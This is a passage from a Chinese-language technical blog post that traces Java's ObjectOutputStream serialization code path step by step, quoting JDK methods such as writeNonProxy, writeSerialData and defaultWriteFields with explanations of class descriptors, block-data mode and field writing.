&#123;</span><br><span class="line">        ReflectUtil.checkPackageAccess(cl);</span><br><span class="line">    &#125;</span><br><span class="line">    annotateClass(cl);</span><br><span class="line">    bout.setBlockDataMode(<span class="keyword">false</span>);</span><br><span class="line">    bout.writeByte(TC_ENDBLOCKDATA);</span><br><span class="line"></span><br><span class="line">    writeClassDesc(desc.getSuperDesc(), <span class="keyword">false</span>); <span class="comment">//递归调用</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先写入<code>TC_CLASSDESC</code>标记（表新类描述信息的开始）信息，然后判断使用的模式是<code>unshared</code>模式，那么将<code>desc</code>所表示的<strong>类元数据信息</strong>插入到<code>handles</code>对象的映射表中，然后根据使用的流协议版本调用不同的write方法，如果使用的流协议是<code>PROTOCOL_VERSION_1</code>，那么直接调用<code>desc</code>成员的<code>writeNonProxy</code>方法，并且将当前引用<code>this</code>作为实参传入到<code>writeNonProxy</code>方法中，如果使用的不是<code>PROTOCOL_VERSION_1</code>协议，那么会调用当前类中的<code>writeClassDescriptor</code>方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">writeClassDescriptor</span><span class="params">(ObjectStreamClass desc)</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    desc.writeNonProxy(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续跟进<code>writeNonProxy</code>中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Writes non-proxy class descriptor information to given output stream.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">writeNonProxy</span><span class="params">(ObjectOutputStream out)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    out.writeUTF(name);</span><br><span class="line">    out.writeLong(getSerialVersionUID());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">byte</span> flags = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (externalizable) &#123;</span><br><span class="line">        flags |= ObjectStreamConstants.SC_EXTERNALIZABLE;</span><br><span class="line">        <span class="keyword">int</span> protocol = out.getProtocolVersion();</span><br><span class="line">        <span class="keyword">if</span> (protocol != ObjectStreamConstants.PROTOCOL_VERSION_1) &#123;</span><br><span class="line">            flags |= ObjectStreamConstants.SC_BLOCK_DATA;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (serializable) &#123;</span><br><span class="line">        flags |= ObjectStreamConstants.SC_SERIALIZABLE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (hasWriteObjectData) &#123;</span><br><span class="line">        flags |= ObjectStreamConstants.SC_WRITE_METHOD;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (isEnum) &#123;</span><br><span class="line">        flags |= ObjectStreamConstants.SC_ENUM;</span><br><span class="line">    &#125;</span><br><span class="line">    out.writeByte(flags);</span><br><span class="line"></span><br><span class="line">    out.writeShort(fields.length);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; fields.length; i++) &#123;</span><br><span class="line">        ObjectStreamField f = fields[i];</span><br><span class="line">        out.writeByte(f.getTypeCode());</span><br><span class="line">        out.writeUTF(f.getName());</span><br><span class="line">        <span class="keyword">if</span> (!f.isPrimitive()) &#123;</span><br><span class="line">            out.writeTypeString(f.getTypeString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先调用<code>writeUTF</code>方法写入<strong>类名</strong>到字节流(bout)，这里的类名是类全名，带了包名的那种（<code>out.writeUTF(name);</code>）</p><p>再调用<code>writeLong</code>方法写入<code>serialVersionUID</code>的值到字节流（<code>out.writeLong(getSerialVersionUID());</code>）</p><p>然后开始写入当前类中成员属性的数量信息到字节流（<code>out.writeShort(fields.length);</code>）</p><p>最后会写入每一个字段的信息，这里的字段信息包含三部分内容：<code>TypeCode</code>、<code>fieldName</code>、<code>fieldType</code> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"> out.writeShort(fields.length);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; fields.length; i++) &#123;</span><br><span class="line">    ObjectStreamField f = fields[i];</span><br><span class="line">    out.writeByte(f.getTypeCode());</span><br><span class="line">    out.writeUTF(f.getName());</span><br><span class="line">    <span class="keyword">if</span> (!f.isPrimitive()) &#123;</span><br><span class="line">        out.writeTypeString(f.getTypeString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到这里<code>writeClassDescriptor</code>就走完了，回到上一层，发现又打开了块模式<code>bout.setBlockDataMode(true);</code></p><p>再往下会调用<code>annotateClass(cl);</code> 但是跟进去发现什么都没有（迷</p><p>在调用<code>annotateClass</code>方法完成过后，代码会关闭<code>Data Block</code>模式，然后写入<code>TC_ENDBLOCKDATA</code>标记（表示当前非动态代理类的描述信息的终止）。</p><p>到这里，<code>writeNonProxy</code>和<code>writeClassDescriptor</code><strong>流程结束</strong>，同样，也导致<code>writeClassDesc</code><strong>流程结束</strong>，并且回到<code>writeOrdinaryObject</code>方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeOrdinaryObject</span><span class="params">(Object obj,</span></span></span><br><span class="line"><span class="function"><span class="params">                                 ObjectStreamClass desc,</span></span></span><br><span class="line"><span class="function"><span class="params">                                 <span class="keyword">boolean</span> unshared)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">        debugInfoStack.push(</span><br><span class="line">            (depth == <span class="number">1</span> ? <span class="string">"root "</span> : <span class="string">""</span>) + <span class="string">"object (class \""</span> +</span><br><span class="line">            obj.getClass().getName() + <span class="string">"\", "</span> + obj.toString() + <span class="string">")"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        desc.checkSerialize();</span><br><span class="line"></span><br><span class="line">        bout.writeByte(TC_OBJECT);</span><br><span class="line">        writeClassDesc(desc, <span class="keyword">false</span>);</span><br><span class="line">        handles.assign(unshared ? <span class="keyword">null</span> : obj);</span><br><span class="line">        <span class="keyword">if</span> (desc.isExternalizable() &amp;&amp; !desc.isProxy()) &#123;</span><br><span class="line">            writeExternalData((Externalizable) obj);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            writeSerialData(obj, desc);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">            debugInfoStack.pop();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来来到<code>handles.assign(unshared ? null : obj);</code> 这里如果使用的模式是<code>unshared</code>模式，则将<code>desc</code>所表示的类元数据信息插入到<code>handles</code>对象的映射表中，最后会判断当前Java对象的序列化语义，如果当前对象不是一个<strong>动态代理类</strong>并且是实现了<strong>外部化</strong>的，则调用<code>writeExternalData</code>方法写入对象信息，如果当前对象是一个实现了<code>Serializable</code>接口的，则调用<code>writeSerialData</code>方法写入对象信息。</p><p>接下来将类数据信息序列化，写入bout，<strong>进入<code>writeSerialData</code>函数</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Writes instance data for each serializable class of given object, from</span></span><br><span class="line"><span class="comment"> * superclass to subclass.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeSerialData</span><span class="params">(Object obj, ObjectStreamClass desc)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ObjectStreamClass.ClassDataSlot[] slots = desc.getClassDataLayout();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; slots.length; i++) &#123;</span><br><span class="line">        ObjectStreamClass slotDesc = slots[i].desc;</span><br><span class="line">      <span class="comment">//如果当前对象有自定义writeObject方法</span></span><br><span class="line">        <span class="keyword">if</span> (slotDesc.hasWriteObjectMethod()) &#123;</span><br><span class="line">            PutFieldImpl oldPut = curPut;</span><br><span class="line">            curPut = <span class="keyword">null</span>;</span><br><span class="line">            SerialCallbackContext oldContext = curContext;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">                debugInfoStack.push(</span><br><span class="line">                    <span class="string">"custom writeObject data (class \""</span> +</span><br><span class="line">                    slotDesc.getName() + <span class="string">"\")"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                curContext = <span class="keyword">new</span> SerialCallbackContext(obj, slotDesc);</span><br><span class="line">                bout.setBlockDataMode(<span class="keyword">true</span>);</span><br><span class="line">                slotDesc.invokeWriteObject(obj, <span class="keyword">this</span>);<span class="comment">// 调用自定义序列化 writeObject 方法</span></span><br><span class="line">                bout.setBlockDataMode(<span class="keyword">false</span>);</span><br><span class="line">                bout.writeByte(TC_ENDBLOCKDATA);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                curContext.setUsed();</span><br><span class="line">                curContext = oldContext;</span><br><span class="line">                <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">                    debugInfoStack.pop();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            curPut = oldPut;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="comment">//默认序列化操作</span></span><br><span class="line">            defaultWriteFields(obj, slotDesc);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就像注释说的一样，会为给定对象的每个可序列化的类写入实例数据，从父类到子类。</p><p>再这个方法内会首先判断当前使用的字节流协议，如果使用的是<code>PROTOCOL_VERSION_1</code>协议，那么回直接调用可序列化对象中的<code>writeExternal</code>方法，如果使用的不是<code>PROTOCOL_VERSION_1</code>协议，那么会先开启<code>Data Block</code>模式，再调用<code>writeExternal</code>方法，调用完毕后再关闭<code>Data Block</code>模式并在该流的最后追加<code>TC_ENDBLOCKDATA</code>标记。</p><p>值得一提的是，这个方法有一个切换上下文环境的过程——在检测协议前，首先令<code>curPut</code>和<code>curContext</code>为空，检测并写入数据后，再分别令<code>curContext</code> <code>curPut</code>为<code>oldContext</code>和<code>oldPut</code>，恢复执行之前的环境。</p><h2 id="为什么要切换上下文？"><a href="#为什么要切换上下文？" class="headerlink" title="为什么要切换上下文？"></a>为什么要切换上下文？</h2><p>再来看看<code>writeSerialData</code>就明白了</p><p>这个方法主要向obj对象写入数据信息，比如字段值和相关引用等，写入的时候会从<strong>顶级父类从上至下递归执行</strong></p><p>详细过程：</p><p>首先<code>ObjectStreamClass.ClassDataSlot[] slots = desc.getClassDataLayout();</code></p><p>跟进去看：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Returns array of ClassDataSlot instances representing the data layout</span></span><br><span class="line"><span class="comment"> * (including superclass data) for serialized objects described by this</span></span><br><span class="line"><span class="comment"> * class descriptor.  ClassDataSlots are ordered by inheritance with those</span></span><br><span class="line"><span class="comment"> * containing "higher" superclasses appearing first.  The final</span></span><br><span class="line"><span class="comment"> * ClassDataSlot contains a reference to this descriptor.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ClassDataSlot[] getClassDataLayout() <span class="keyword">throws</span> InvalidClassException &#123;</span><br><span class="line">    <span class="comment">// REMIND: synchronize instead of relying on volatile?</span></span><br><span class="line">    <span class="keyword">if</span> (dataLayout == <span class="keyword">null</span>) &#123;</span><br><span class="line">        dataLayout = getClassDataLayout0();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dataLayout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>翻译注释，该方法返回代表该类描述符所描述的序列化对象的数据布局（包括父类数据）的ClassDataSlot实例阵列。 </p><p>ClassDataSlots按继承顺序排列，那些包含 “更高 “的父类的实例出现在前面。 最后的ClassDataSlot包含对这个描述符的引用。</p><p>也就是说，如果该对象拥有父类，slots里按顺序存放的先是父类后是子类。</p><p>也就是说，slots里面存放的是继承结构，用来后续遍历。</p><p>接下来开始对slots遍历：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeSerialData</span><span class="params">(Object obj, ObjectStreamClass desc)</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ObjectStreamClass.ClassDataSlot[] slots = desc.getClassDataLayout();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; slots.length; i++) &#123;</span><br><span class="line">        ObjectStreamClass slotDesc = slots[i].desc;</span><br><span class="line">        <span class="keyword">if</span> (slotDesc.hasWriteObjectMethod()) &#123;</span><br><span class="line">            PutFieldImpl oldPut = curPut;</span><br><span class="line">            curPut = <span class="keyword">null</span>;</span><br><span class="line">            SerialCallbackContext oldContext = curContext;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">                debugInfoStack.push(</span><br><span class="line">                    <span class="string">"custom writeObject data (class \""</span> +</span><br><span class="line">                    slotDesc.getName() + <span class="string">"\")"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                curContext = <span class="keyword">new</span> SerialCallbackContext(obj, slotDesc);</span><br><span class="line">                bout.setBlockDataMode(<span class="keyword">true</span>);</span><br><span class="line">                slotDesc.invokeWriteObject(obj, <span class="keyword">this</span>);</span><br><span class="line">                bout.setBlockDataMode(<span class="keyword">false</span>);</span><br><span class="line">                bout.writeByte(TC_ENDBLOCKDATA);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                curContext.setUsed();</span><br><span class="line">                curContext = oldContext;</span><br><span class="line">                <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">                    debugInfoStack.pop();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            curPut = oldPut;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            defaultWriteFields(obj, slotDesc);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先，判断可序列化对象是否重写了<code>writeObject</code>方法，如果重写了该方法，则先开启<code>Data Block</code>模式，去调用<code>writeObject</code>方法，调用结束后再关闭<code>Data Block</code>模式，并且在最后追加<code>TC_ENDBLOCKDATA</code>标记（表示数据块写入终止），如果没有重写该方法，则调用<code>defaultWriteFields</code>方法写入当前对象中的所有字段的值，跟进<code>defaultWriteFields</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">defaultWriteFields</span><span class="params">(Object obj, ObjectStreamClass desc)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    Class&lt;?&gt; cl = desc.forClass();</span><br><span class="line">    <span class="keyword">if</span> (cl != <span class="keyword">null</span> &amp;&amp; obj != <span class="keyword">null</span> &amp;&amp; !cl.isInstance(obj)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> ClassCastException();</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    desc.checkDefaultSerialize();<span class="comment">//判断该对象是否可序列化</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. Java 原生类型 序列化</span></span><br><span class="line">    <span class="keyword">int</span> primDataSize = desc.getPrimDataSize();      <span class="comment">// 1.1 获取原生类型字段的长度</span></span><br><span class="line">    <span class="keyword">if</span> (primVals == <span class="keyword">null</span> || primVals.length &lt; primDataSize) &#123;</span><br><span class="line">        primVals = <span class="keyword">new</span> <span class="keyword">byte</span>[primDataSize];</span><br><span class="line">    &#125;</span><br><span class="line">    desc.getPrimFieldValues(obj, primVals);         <span class="comment">// 1.2 获取原生类型字段的值</span></span><br><span class="line">    bout.write(primVals, <span class="number">0</span>, primDataSize, <span class="keyword">false</span>);   <span class="comment">// 1.3 原生类型序列化</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. Java 对象类型 序列化，递归调用 writeObject0 方法</span></span><br><span class="line">    ObjectStreamField[] fields = desc.getFields(<span class="keyword">false</span>);     <span class="comment">// 2.1 获取所有序列化的字段</span></span><br><span class="line">    Object[] objVals = <span class="keyword">new</span> Object[desc.getNumObjFields()];</span><br><span class="line">    <span class="keyword">int</span> numPrimFields = fields.length - objVals.length;</span><br><span class="line">    desc.getObjFieldValues(obj, objVals);                   <span class="comment">// 2.2 获取所有序列化字段的值</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; objVals.length; i++) &#123;              <span class="comment">// 2.3 递归完成序列化</span></span><br><span class="line">        writeObject0(objVals[i], fields[numPrimFields + i].isUnshared());            </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>翻译注释：</p><blockquote><p>抓取并写入给定对象的可序列化字段的值到流。 给定的类描述符指定要写哪些字段值，以及它们应该以何种顺序被写入。</p></blockquote><p>也就是说，<code>defaultWriteFields</code>方法负责读取 obj 对象中的字段数据，并且将字段数据写入到字节流中。</p><p>首先，<code>desc.checkDefaultSerialize();</code>用来判断该类对象是否是一个可序列化的类。</p><p>检查完毕后，分两步：</p><ol><li><strong>基础类型</strong></li></ol><p>获取该对象中所有基础类型字段的值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">desc.getPrimFieldValues(obj, primVals);</span><br></pre></td></tr></table></figure><p>跟进去：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Fetches the serializable primitive field values of object obj and</span></span><br><span class="line"><span class="comment"> * marshals them into byte array buf starting at offset 0.  The caller</span></span><br><span class="line"><span class="comment"> * is responsible for ensuring that obj is of the proper type.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getPrimFieldValues</span><span class="params">(Object obj, <span class="keyword">byte</span>[] buf)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (obj == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* assuming checkDefaultSerialize() has been called on the class</span></span><br><span class="line"><span class="comment">     * descriptor this FieldReflector was obtained from, no field keys</span></span><br><span class="line"><span class="comment">     * in array should be equal to Unsafe.INVALID_FIELD_OFFSET.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; numPrimFields; i++) &#123;</span><br><span class="line">        <span class="keyword">long</span> key = readKeys[i];</span><br><span class="line">        <span class="keyword">int</span> off = offsets[i];</span><br><span class="line">        <span class="keyword">switch</span> (typeCodes[i]) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'Z'</span>:</span><br><span class="line">                Bits.putBoolean(buf, off, unsafe.getBoolean(obj, key));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="string">'B'</span>:</span><br><span class="line">                buf[off] = unsafe.getByte(obj, key);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="string">'C'</span>:</span><br><span class="line">                Bits.putChar(buf, off, unsafe.getChar(obj, key));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="string">'S'</span>:</span><br><span class="line">                Bits.putShort(buf, off, unsafe.getShort(obj, key));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="string">'I'</span>:</span><br><span class="line">                Bits.putInt(buf, off, unsafe.getInt(obj, key));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="string">'F'</span>:</span><br><span class="line">                Bits.putFloat(buf, off, unsafe.getFloat(obj, key));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="string">'J'</span>:</span><br><span class="line">                Bits.putLong(buf, off, unsafe.getLong(obj, key));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="string">'D'</span>:</span><br><span class="line">                Bits.putDouble(buf, off, unsafe.getDouble(obj, key));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> InternalError();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里面的8个case分别对应8个基本类型首字母：<code>int-long-float-double-short-char-byte-boolean</code></p><p>获得这些基础类型字段的值后，bout会将他们写入到字节流。</p><ol start="2"><li><strong>对象类型</strong></li></ol><p>到这里说明该field是这部分总体来说就是三步：</p><ul><li>获取所有序列化的字段</li><li>根据desc，获取所有序列化字段的值</li><li>递归完成序列化</li></ul><p><strong>总结：</strong> <strong>defaultWriteFields</strong> 原生类型直接序列化，而非原生类型则需要递归调用 writeObject0 来对字段序列化。</p><p><strong>到这里，整个序列化流程就结束了。</strong></p><h2 id="两个特殊点"><a href="#两个特殊点" class="headerlink" title="两个特殊点"></a>两个特殊点</h2><p>被<code>transient</code>修饰的成员属性具有”不会序列化“的语义，序列化的时候会忽略；</p><p>被<code>static</code>修饰的成员属性隶属于类而非对象，所以它在序列化的时候同样会被忽略。</p><h1 id="补充知识：ObjectStreamClass-amp-ObjectStreamField"><a href="#补充知识：ObjectStreamClass-amp-ObjectStreamField" class="headerlink" title="补充知识：ObjectStreamClass &amp; ObjectStreamField"></a>补充知识：ObjectStreamClass &amp; ObjectStreamField</h1><p>我们在刚才分析序列化流程中：</p><p>出现了desc这个类描述符。它是属于ObjectStreamClass的类对象。</p><p>并且很多次出现了解析Field字段时候，出现了ObjectStreamField这个类。</p><p>翻阅资料：</p><ul><li><code>ObjectStreamField</code> 按官方的说法是是<strong>字段的序列化描述符，本质是对 Field 字段的包装，包括字段名、字段值等</strong>。可以通过 ObjectStreamClass#getFields 获取所有需要序列化的字段信息。</li><li><code>ObjectStreamClass</code> 按官方的说法是<strong>类的序列化描述符</strong>，<strong>本质是对 Class 类的包装</strong>，提取了序列化时类的一些信息，包括字段的描述信息和 serialVersionUID。<strong>可以使用 lookup 方法找到/创建在此 Java VM 中加载的具体类的 ObjectStreamClass</strong>。</li></ul><p>这里其实我的理解是desc就是类的模板，</p><h2 id="ObjectStreamField"><a href="#ObjectStreamField" class="headerlink" 